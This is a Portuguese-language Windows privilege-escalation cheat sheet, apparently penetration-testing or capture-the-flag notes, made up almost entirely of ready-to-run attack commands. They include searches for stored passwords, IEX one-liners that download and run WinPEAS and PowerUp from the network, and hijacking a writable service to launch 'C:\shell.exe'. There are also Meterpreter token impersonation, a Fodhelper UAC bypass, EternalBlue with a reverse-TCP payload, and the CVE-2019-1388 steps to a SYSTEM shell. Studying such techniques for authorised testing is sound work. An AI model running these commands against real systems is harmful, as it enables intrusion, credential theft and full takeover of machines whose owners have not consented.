# 🪟 Windows PrivEsc (WinPEAS, Serviços, Tokens, UAC, EternalBlue)

---

## 1. Enumeração Manual Essencial no CMD / PowerShell

```cmd
:: Informações do Sistema e Hostname
systeminfo & hostname

:: Privilégios do Usuário e Grupos
whoami /priv
whoami /groups
net user & net localgroup Administradores

:: Processos e Serviços Ativos
tasklist /SVC
sc query & wmic service get Name,State,PathName

:: Rede e Firewall
ipconfig /all & arp -a & route print & netstat -ano
netsh advfirewall show currentprofile

:: Busca de Senhas em Arquivos e Registro
dir /s *password* /a
findstr /si password *.txt *.ini *.config
reg query HKLM /f password /t REG_SZ /s
```

---

## 2. Enumeração Automatizada

```powershell
# WinPEAS (Execução direta via PowerShell)
powershell -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"

# PowerUp (Verificação de vulnerabilidades de serviços)
powershell -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

---

## 3. Principais Vetores de Escalação no Windows

### Serviços com Permissão de Escrita (`Unquoted Service Path` / `Weak Service Permissions`)
```cmd
:: Inspecionar permissões no binário do serviço
accesschk.exe -uwcqv "Usuarios" *

:: Alterar caminho do binário do serviço para o payload malicioso
sc config NOME_SERVICO binPath= "C:\shell.exe"
sc start NOME_SERVICO
```

### Token Impersonation (Incognito no Meterpreter)
```bash
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

### UAC Bypass (Fodhelper)
```bash
use post/windows/manage/bypassuac_fodhelper
set SESSION 1
run
```

### EternalBlue (MS17-010)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS IP_ALVO
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

> [!note] SempreNotify (CVE-2019-1388)
> 1. Execute o instalador vulnerável com certificado expirado.
> 2. Clique em *"Ver Certificado"* -> *"Detalhes"* -> *"Salvar como..."*.
> 3. No diálogo de arquivo, abra o navegador e navegue até `C:\Windows\System32\cmd.exe`.
> 4. O prompt de comando abrirá com privilégios de `SYSTEM`.